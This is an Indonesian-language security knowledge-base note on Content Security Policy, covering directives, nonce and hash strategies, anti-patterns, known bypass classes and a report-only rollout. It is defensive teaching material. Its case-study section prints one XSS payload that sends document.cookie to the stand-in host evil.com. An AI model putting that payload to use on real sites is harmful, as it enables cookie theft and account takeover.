---
title: Content Security Policy Best Practices
tags: [security, web, csp]
aliases: [csp-best-practices]
---
# CSP Best Practices

Content Security Policy (CSP) adalah header HTTP (`Content-Security-Policy`) yang membatasi sumber daya (script, style, image, connect) yang bisa dimuat browser — mitigasi utama XSS dan data injection.

## Daftar Directive Utama

| Directive | Fungsi | Nilai Umum |
|-----------|--------|------------|
| `default-src` | Fallback semua tipe | `'self'` |
| `script-src` | Sumber script | `'self'`, nonce, hash |
| `style-src` | Sumber CSS | `'self'`, `'unsafe-inline'` (hati-hati) |
| `img-src` | Gambar | `'self' data: https:` |
| `connect-src` | fetch/XHR/WebSocket | `'self' https://api.example.com` |
| `frame-src` | iframe | `'self'` |
| `object-src` | plugin (Flash dll) | `'none'` (wajib) |
| `base-uri` | `<base>` hijack | `'self'` |
| `form-action` | Submit form | `'self'` |
| `frame-ancestors` | Clickjacking (X-Frame-Options modern) | `'self'` |
| `upgrade-insecure-requests` | Upgrade HTTP→HTTPS | - |

## Strategi Implementasi

### Baseline Aman
```
Content-Security-Policy: default-src 'none'; script-src 'self';
  style-src 'self'; img-src 'self' data:; connect-src 'self';
  font-src 'self'; object-src 'none'; base-uri 'self';
  frame-ancestors 'self'; form-action 'self'
```

### Nonce (recommended untuk inline script)
```
script-src 'self' 'nonce-<random-per-response>'
```
Server generate nonce baru tiap response; script inline wajib punya nonce yang sama. Stateless, cache-aware (jangan nonce statis di CDN cache!).

### Hash (untuk static inline)
```
script-src 'self' 'sha256-<base64-hash-of-script>'
```
Cocok untuk inline script yang jarang berubah (analytics snippet).

## Anti-pattern yang Harus Dihindari

1. `'unsafe-inline'` di script-src — menghancurkan semua proteksi XSS (kecuali dengan nonce/hash).
2. `'unsafe-eval'` — izinkan eval() — lubang besar.
3. Whitelist domain lebar: `https:` (semua HTTPS) atau `*.googleapis.com` — memudahkan attacker domain yang diizinkan.
4. `default-src *` — tidak ada proteksi.
5. Nonce statis/reusable — sama saja tidak pakai.

## Bypass yang Diketahui (Red Team)

- **JSONP endpoints** pada domain yang di-whitelist → script arbitrary via callback.
- **Dangling markup / mutation XSS** — payload yang memanfaatkan parser mutation (mXSS).
- **Unintended CDN/upload host** di whitelist (mis. `*.cloudfront.net` dengan upload publik).
- **CSP report-only diabaikan** — pastikan enforcement, bukan cuma report.
- **Header injection** — jika attacker bisa inject header (CRLF), CSP bisa ditimpa/duplikat (browser ambil yang lenient? tergantung).

## Monitoring & Reporting

```
Content-Security-Policy-Report-Only: ... ; report-uri /csp-report
```
- Mulai dari report-only untuk mengukur pelanggaran legal (aplikasi bermasalah) sebelum enforcement.
- `report-to` (modern) vs `report-uri` (legacy).
- Endpoint kumpulkan: pelanggaran = indikasi XSS attempt atau aplikasi broken.

## Tools

- **CSP Evaluator** (Google) — cek directive yang melemahkan.
- **CSP Scanner** — audit header lintas endpoint.
- **curl** test: `curl -I https://site | grep -i content-security`
- Browser devtools: Security panel, console warnings.
- **csp-evaluator npm** / online.

## Checklist

- [ ] `object-src 'none'` + `base-uri 'self'` terpasang?
- [ ] Tidak ada `'unsafe-inline'`/`'unsafe-eval'` tanpa nonce/hash?
- [ ] Whitelist sesempit mungkin (bukan `https:`)?
- [ ] Enforcement aktif (bukan report-only)?
- [ ] Report endpoint aktif + monitoring pelanggaran?
- [ ] Diuji dengan CSP Evaluator?

## Koneksi ke Vault

- [[js-framework-vulnerabilities]] — XSS di framework SPA (React/Vue) sering bergantung CSP untuk mitigasi tambahan.
- [[waf-internal-architecture-deepdive]] — WAF tidak bisa mencegah DOM-XSS; CSP adalah kontrol browser-side.
- [[hierarchy-waf-reverse-proxy]] — header security via reverse proxy config.



## Studi Kasus: XSS vs CSP

**Skenario 1 — Tanpa CSP:** payload `<script>fetch('//evil.com/?c='+document.cookie)</script>` langsung jalan. Semua cookie bocor (kecuali HttpOnly).

**Skenario 2 — CSP `'self'`:** script inline diblokir. Attacker harus cari script di domain sendiri (upload endpoint? JSONP?) — surface jauh lebih kecil.

**Skenario 3 — CSP dengan nonce:** hanya script dengan nonce valid jalan; attacker tidak tahu nonce → dead end (kecuali nonce bocor via HTML injection di tempat lain).

## CSP untuk Aplikasi SPA (React/Vue/Angular)

SPA membutuhkan inline script (webpack runtime) → gunakan nonce atau hash:
```
script-src 'self' 'nonce-<n>'; 
```
Catatan: library dev mode sering pakai eval (webpack devtool) — pastikan production build tidak eval. Test di production bundle: cari `eval(` di bundle (jika ada, kurangi build).

## Content-Security-Policy-Report-Only Workflow

1. Deploy report-only dengan policy target → kumpulkan pelanggaran 1-2 minggu.
2. Analisis: pelanggaran legal (aplikasi) vs serangan (attacker).
3. Perbaiki aplikasi untuk pelanggaran legal.
4. Switch ke enforcement + tetap report.
5. Ulangi saat fitur baru ditambahkan.

## Frame & Clickjacking

`frame-ancestors` menggantikan X-Frame-Options (lebih fleksibel):
```
Content-Security-Policy: frame-ancestors 'self' https://partner.example.com
```
Uji: `<iframe src="https://site">` dari domain lain harus ditolak (browser console error).

## Integrasi di Reverse Proxy / CDN

- Nginx: `add_header Content-Security-Policy "..." always;`
- Cloudflare: Transform Rules → set header CSP.
- Hati-hati: header dihapus oleh CDN cache jika dinamis (nonce) — pastikan config.

## Kesalahan Implementasi Umum

1. Header ditulis di satu tempat tapi halaman di-serve dari path lain (belum sampai).
2. CSP hanya di HTML, tidak di API/error pages (XSS tetap bisa lewat error page).
3. Report-only tidak pernah di-switch ke enforce.
4. CSP mati saat user-agent lama tidak support → fallback: tetap ada X-Frame-Options, HSTS.
5. Nonce bocor di cache public CDN → semua request pakai nonce sama.

---

  audited
---